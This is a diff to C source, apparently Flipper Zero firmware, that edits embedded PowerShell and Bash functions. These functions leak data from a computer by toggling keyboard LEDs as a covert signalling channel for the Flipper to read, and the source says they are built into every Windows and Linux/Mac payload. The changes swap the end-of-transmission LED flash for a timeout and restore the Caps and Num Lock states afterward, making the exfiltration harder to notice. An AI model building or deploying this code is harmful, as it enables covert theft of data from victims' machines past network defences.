@@ -21,7 +21,10 @@
  *        - Set Num Lock to bit0 of the dibit (toggle if needed)
  *        - Toggle Scroll Lock once as clock signal
  *        - Brief delay for Flipper to read
- *   5. End-of-transmission: toggle all 3 LEDs (Caps+Num+Scroll) 3 times
+ *   5. End-of-transmission: stop toggling Scroll Lock. The Flipper
+ *      detects end-of-data via clock timeout (no Scroll Lock edge for
+ *      HID_EXFIL_CLOCK_TIMEOUT_MS). After the data loop, the encoder
+ *      restores Caps Lock and Num Lock to their pre-data states.
  *
  * The PowerShell encoder function is embedded in every Windows payload.
  * The Bash encoder function is embedded in every Linux/Mac payload.
@@ -56,6 +59,8 @@ static const char* ps_encoder_func =
     "    public static extern short GetKeyState(int nVirtKey);\r\n"
     "  }\r\n"
     "\"@\r\n"
+    "  $saveCaps = [KBLed]::GetState([KBLed]::VK_CAPITAL)\r\n"
+    "  $saveNum = [KBLed]::GetState([KBLed]::VK_NUMLOCK)\r\n"
     "  $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)\r\n"
     "  foreach ($b in $bytes) {\r\n"
     "    for ($shift = 6; $shift -ge 0; $shift -= 2) {\r\n"
@@ -71,14 +76,7 @@ static const char* ps_encoder_func =
     "      Start-Sleep -Milliseconds 15\r\n"
     "    }\r\n"
     "  }\r\n"
-    "  $saveCaps = [KBLed]::GetState([KBLed]::VK_CAPITAL)\r\n"
-    "  $saveNum = [KBLed]::GetState([KBLed]::VK_NUMLOCK)\r\n"
-    "  for ($i = 0; $i -lt 3; $i++) {\r\n"
-    "    [KBLed]::ToggleKey([KBLed]::VK_CAPITAL)\r\n"
-    "    [KBLed]::ToggleKey([KBLed]::VK_NUMLOCK)\r\n"
-    "    [KBLed]::ToggleKey([KBLed]::VK_SCROLL)\r\n"
-    "    Start-Sleep -Milliseconds 50\r\n"
-    "  }\r\n"
+    "  Start-Sleep -Milliseconds 300\r\n"
     "  if ([KBLed]::GetState([KBLed]::VK_CAPITAL) -ne $saveCaps) { [KBLed]::ToggleKey([KBLed]::VK_CAPITAL) }\r\n"
     "  if ([KBLed]::GetState([KBLed]::VK_NUMLOCK) -ne $saveNum) { [KBLed]::ToggleKey([KBLed]::VK_NUMLOCK) }\r\n"
     "}\r\n";
@@ -92,6 +90,8 @@ static const char* bash_encoder_func =
     "send_led_data() {\r\n"
     "  local data=\"$1\"\r\n"
     "  local len=${#data}\r\n"
+    "  local save_caps=$(xset q 2>/dev/null | grep -c 'Caps Lock:.*on')\r\n"
+    "  local save_num=$(xset q 2>/dev/null | grep -c 'Num Lock:.*on')\r\n"
     "  for (( i=0; i<len; i++ )); do\r\n"
     "    local ch=\"${data:$i:1}\"\r\n"
     "    local byte=$(printf '%d' \"'$ch\")\r\n"
@@ -112,10 +112,11 @@ static const char* bash_encoder_func =
     "      sleep 0.015\r\n"
     "    done\r\n"
     "  done\r\n"
-    "  for i in 1 2 3; do\r\n"
-    "    xdotool key Caps_Lock Num_Lock Scroll_Lock 2>/dev/null\r\n"
-    "    sleep 0.05\r\n"
-    "  done\r\n"
+    "  sleep 0.3\r\n"
+    "  local end_caps=$(xset q 2>/dev/null | grep -c 'Caps Lock:.*on')\r\n"
+    "  local end_num=$(xset q 2>/dev/null | grep -c 'Num Lock:.*on')\r\n"
+    "  if [ \"$end_caps\" -ne \"$save_caps\" ]; then xdotool key Caps_Lock 2>/dev/null; fi\r\n"
+    "  if [ \"$end_num\" -ne \"$save_num\" ]; then xdotool key Num_Lock 2>/dev/null; fi\r\n"
     "}\r\n";
 
 /* ========================================================================
